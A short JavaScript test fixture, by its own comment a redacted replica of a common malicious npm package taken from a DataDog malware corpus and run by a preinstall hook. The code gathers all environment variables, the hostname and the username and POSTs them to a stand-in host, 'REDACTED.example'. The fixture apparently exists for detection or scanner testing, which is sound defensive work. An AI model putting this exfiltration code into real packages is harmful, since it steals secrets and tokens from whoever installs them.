// REDACTED replica of the dominant npm malicious-intent shape in the DataDog
// public corpus: the manifest carries only `preinstall: node index.js`, and
// the whole payload lives here, in the tarball. Inert fixture, never executed.
const os = require("os");
const https = require("https");

const payload = JSON.stringify({
  env: process.env,
  host: os.hostname(),
  user: os.userInfo().username,
});

const req = https.request(
  { hostname: "REDACTED.example", port: 443, path: "/c", method: "POST" },
  () => {},
);
req.on("error", () => {});
req.write(payload);
req.end();
